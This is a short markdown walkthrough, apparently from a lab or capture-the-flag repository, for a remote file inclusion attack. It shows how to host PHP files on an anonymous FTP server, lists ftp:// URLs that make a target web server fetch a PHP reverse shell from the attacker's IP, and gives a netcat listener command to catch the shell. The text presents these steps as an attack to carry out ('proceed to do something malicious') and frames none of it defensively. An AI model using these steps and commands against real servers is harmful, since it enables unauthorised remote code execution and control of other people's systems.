# SETTING UP THE FTP SERVER

1: install vsftpd on your machine

	sudo apt-get install vsftpd

2: enable anonymous logins

change the line `anonymous_enable=No` to end wth `Yes`

*alternatively you could set up a legit user and encode this in the url*
*https://help.ubuntu.com/lts/serverguide/ftp-server.html*

3: copy the php files to the ftp directory

	cp ./*.php /srv/ftp/
 
----------------------------
# TRYING TO ACCESS THE FILES

we want the web server to send a request to us to get a file
so we will input a command that makes their server send a request to download our malicious file
here are some commands I think might work

	ftp://192.168.3.158/srv/ftp/hello.php
	ftp://192.168.3.158/srv/ftp/php-reverse-shell.php
	ftp://user:password@192.168.3.158:port/path

**replace my IP with yours**

these commands are also in the file *commands* so u can cat the file and easily copy and paste them

--------------------------
# USING THE REVERSE SHELL

To check that we can get the server to execute our php code first try to get the server to access our *hello.php* file and see if it makes an alert to the screen

Once this works proceed to do something malicious, e.g get a reverse shell

**prep the *reverse-shell.php* by replacing the hardcoded IP address in that to whatever your IP is, this is a reverse shell, not a bind shell**

Then, before u get the server to execute the file on your machine run the following command

	nc -lkp 1234

this starts netcat, **l**istening on **p**ort 1234, and in **k**eep alive mode

when the file gets executed this should give you a shell on the target
